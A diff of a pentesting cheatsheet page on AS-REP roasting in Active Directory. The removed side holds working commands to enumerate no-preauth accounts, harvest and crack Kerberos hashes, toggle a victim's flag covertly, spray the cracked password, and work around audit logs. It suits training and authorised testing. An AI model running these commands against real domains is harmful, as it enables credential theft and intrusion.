@@ -1,460 +1,72 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AS-REP Roasting | JinPwn</title><meta name="description" content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/">
-<meta property="og:title" content="AS-REP Roasting | JinPwn">
-<meta property="og:description" content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="AS-REP Roasting | JinPwn">
-<meta name="twitter:description" content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user\u0026rsquo;s NT key. Crack offline.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"AS-REP Roasting | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link is-current">AS-REP Roasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>AS-REP Roasting</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">AS-REP Roasting</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Active Directory Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link is-current">AS-REP Roasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Request a TGT for any user without <code>DONT_REQ_PREAUTH</code> set. The response is encrypted with the user&rsquo;s NT key. Crack offline.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
-</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
-</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
-</span></span></code></pre></div><h2 id="i-find-as-rep-roastable-users" data-heading-permalink="true"><span class="heading-content">i. Find AS-REP roastable users</span>
-    <a class="heading-permalink" href="#i-find-as-rep-roastable-users" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>UAC flag is <code>DONT_REQ_PREAUTH</code> (bit 4194304 / 0x400000).</p>
-<p>BloodHound:</p>
-<pre tabindex="0"><code class="language-cypher" data-lang="cypher">MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name
-</code></pre><p>bloodyAD filter:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --attr samaccountname
-</span></span></code></pre></div><p>nxc enumerates and pulls hashes in one call (see next section).</p>
-<h2 id="ii-with-creds-roast-everything" data-heading-permalink="true"><span class="heading-content">ii. With creds, roast everything</span>
-    <a class="heading-permalink" href="#ii-with-creds-roast-everything" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>nxc, pulls every no-preauth user automatically:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --asreproast asrep.txt
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span> --asreproast asrep.txt
-</span></span><span class="line"><span class="cl"><span class="c1">## When DNS is funky:</span>
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --asreproast asrep.txt --kdcHost <span class="nv">$DOMAIN</span>
-</span></span></code></pre></div><p>impacket-GetNPUsers:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers -dc-ip <span class="nv">$DC</span> -request <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/&#34;</span> -usersfile users.txt -format hashcat -outputfile asrep.txt
-</span></span><span class="line"><span class="cl"><span class="c1">## With creds (no usersfile needed, enumerates from LDAP):</span>
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers -dc-ip <span class="nv">$DC</span> -request <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -format hashcat -outputfile asrep.txt
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers -dc-ip <span class="nv">$DC</span> -request -hashes :<span class="nv">$NTHASH</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">&#34;</span> -format hashcat -outputfile asrep.txt
-</span></span></code></pre></div><p>Rubeus from Windows:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-</span></span><span class="line"><span class="cl">Rubeus.exe asreproast /user:victim /format:hashcat /outfile:asrep.txt
-</span></span></code></pre></div><h2 id="iii-without-creds-just-a-user-list" data-heading-permalink="true"><span class="heading-content">iii. Without creds, just a user list</span>
-    <a class="heading-permalink" href="#iii-without-creds-just-a-user-list" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>This is why AS-REP roasting is special: you don&rsquo;t need a valid credential, just a username to test. kerbrute + nxc combo:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 1. Enumerate valid usernames</span>
-</span></span><span class="line"><span class="cl">kerbrute userenum -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.valid
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 2. nxc with empty password against the user list</span>
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u users.valid -p <span class="s1">&#39;&#39;</span> --asreproast asrep-anon.txt
-</span></span></code></pre></div><p>Or impacket directly with a username list and no creds:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers -dc-ip <span class="nv">$DC</span> -no-pass -usersfile users.valid -format hashcat -outputfile asrep.txt
-</span></span></code></pre></div><div class="obsidian-callout callout-tip">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Always test</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>Even when you don&rsquo;t know if any users are no-preauth, run <code>nxc ldap $DC -u users.valid -p '' --asreproast</code> - empty hash file = nothing to roast, valid hashes = free creds.</p>
-  </div>
-</div>
-<h2 id="iv-targeted-as-rep-set-dont_req_preauth-yourself" data-heading-permalink="true"><span class="heading-content">iv. Targeted AS-REP (set DONT_REQ_PREAUTH yourself)</span>
-    <a class="heading-permalink" href="#iv-targeted-as-rep-set-dont_req_preauth-yourself" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you have GenericWrite (or any UAC-write right) on a user, flip the flag, roast, flip it back. bloodyAD makes this clean:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 1. Add the flag</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add uac victim -f DONT_REQ_PREAUTH
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 2. Roast the now-vulnerable user</span>
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers -dc-ip <span class="nv">$DC</span> -no-pass -usersfile &lt;<span class="o">(</span><span class="nb">echo</span> victim<span class="o">)</span> -format hashcat -outputfile asrep.txt
-</span></span><span class="line"><span class="cl"><span class="c1">## or nxc:</span>
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u victim -p <span class="s1">&#39;&#39;</span> --asreproast asrep.txt
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 3. Remove the flag, leave no trace</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove uac victim -f DONT_REQ_PREAUTH
-</span></span></code></pre></div><p>This is the cleanest &ldquo;I have GenericWrite on someone&rdquo; -&gt; &ldquo;I have their hash&rdquo; chain. Often easier than targeted kerberoast because it doesn&rsquo;t require the user to have an SPN attribute.</p>
-<h2 id="v-cracking-the-hash" data-heading-permalink="true"><span class="heading-content">v. Cracking the hash</span>
-    <a class="heading-permalink" href="#v-cracking-the-hash" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Format is <code>$krb5asrep$23$user@DOMAIN:checksum$ciphertext</code>.</p>
-<p>Hashcat:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-</span></span><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> asrep.txt rockyou.txt -r OneRuleToRuleThemAll.rule
-</span></span></code></pre></div><p>John:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --format<span class="o">=</span>krb5asrep --wordlist<span class="o">=</span>rockyou.txt asrep.txt
-</span></span></code></pre></div><p>AS-REP hashes use RC4 (etype 23) by default for the encrypted portion, so cracking speed is comparable to kerberoasting RC4 (much faster than AES TGS).</p>
-<h2 id="vi-after-cracking-what-to-do" data-heading-permalink="true"><span class="heading-content">vi. After cracking, what to do</span>
-    <a class="heading-permalink" href="#vi-after-cracking-what-to-do" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The cracked credential belongs to the no-preauth user. Service accounts and shared accounts are often flagged DONT_REQ_PREAUTH because the admin couldn&rsquo;t get Kerberos pre-auth to work and disabled it. Spray it everywhere:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u victim -p <span class="s1">&#39;Cracked123!&#39;</span> --shares
-</span></span><span class="line"><span class="cl">nxc winrm <span class="nv">$DC</span> -u victim -p <span class="s1">&#39;Cracked123!&#39;</span>
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u victim -p <span class="s1">&#39;Cracked123!&#39;</span> --users
-</span></span></code></pre></div><p>Then re-collect BloodHound to see what edges open up from the newly-owned user.</p>
-<h2 id="vii-why-as-rep-roasting-is-everywhere" data-heading-permalink="true"><span class="heading-content">vii. Why AS-REP roasting is everywhere</span>
-    <a class="heading-permalink" href="#vii-why-as-rep-roasting-is-everywhere" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Old smartcard / multi-domain setups disable pre-auth for compatibility</li>
-<li>Some legacy apps fail with pre-auth enabled, admins disable it as a quick fix</li>
-<li>Auto-provisioning scripts sometimes set the flag during user creation and never unset it</li>
-<li>DONT_REQ_PREAUTH is rarely audited because it doesn&rsquo;t generate normal logs</li>
-</ul>
-<p>On a real engagement, even one no-preauth account in a domain of 10,000 users is often enough to start the chain.</p>
-<h2 id="viii-opsec" data-heading-permalink="true"><span class="heading-content">viii. OpSec</span>
-    <a class="heading-permalink" href="#viii-opsec" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Each AS-REP request logs as Event 4768 on the DC (TGT requested)</li>
-<li>Empty-password binds for asreproast don&rsquo;t log as 4625 (failed auth), they just look like AS_REQs</li>
-<li>Targeted ASREP via UAC flip leaves an audit trail in 5136 (directory object modified) if AD auditing is enabled</li>
-<li>Always remove the flag immediately after roasting in section iv</li>
-</ul>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad03-kerberoasting/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Kerberoasting</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad05-password-spraying/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">Password Spraying</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>AS-REP Roasting | JinPwn</title><meta name=description content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/><meta property="og:title" content="AS-REP Roasting | JinPwn"><meta property="og:description" content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="AS-REP Roasting | JinPwn"><meta name=twitter:description content="Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user\u0026rsquo;s NT key. Crack offline.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"AS-REP Roasting | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
